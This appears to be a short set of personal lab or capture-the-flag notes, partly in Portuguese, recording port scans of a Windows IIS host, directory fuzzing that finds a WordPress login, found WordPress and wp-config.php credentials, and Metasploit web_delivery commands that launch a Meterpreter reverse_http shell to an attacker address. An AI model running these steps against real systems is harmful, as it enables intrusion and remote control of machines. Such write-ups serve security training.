@@ -1,0 +1,56 @@
+RUSTSCAN:
+
+Open 10.129.157.163:80
+Open 10.129.157.163:3389
+
+NMAP:
+
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=RetroWeb
+| Not valid before: 2026-03-24T13:42:53
+|_Not valid after:  2026-09-23T13:42:53
+|_ssl-date: 2026-03-25T13:59:34+00:00; -1s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: RETROWEB
+|   NetBIOS_Domain_Name: RETROWEB
+|   NetBIOS_Computer_Name: RETROWEB
+|   DNS_Domain_Name: RetroWeb
+|   DNS_Computer_Name: RetroWeb
+|   Product_Version: 10.0.14393
+|_  System_Time: 2026-03-25T13:59:29+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+
+FUFF:
+
+/retro
+/wp-login.php
+
+Username: wade
+Password: parzival
+
+CREDENCIAIS DENTRO DE wp-config.php
+
+Username: wordpress567
+Password: YSPgW[%C.mQE
+
+findstr /s /i "CVE-" C:\Users\Wade\*.* --> procurando a cve
+
+use exploit/multi/script/web_delivery --> para responder o ultimo questionario
+|_> show targets -> 2 psh
+
+exploit(multi/script/web_delivery)
+set lhost IP-ATTACK
+set lport 4443
+set target 2
+set payload windows/meterpreter/reverse_http
+run -j
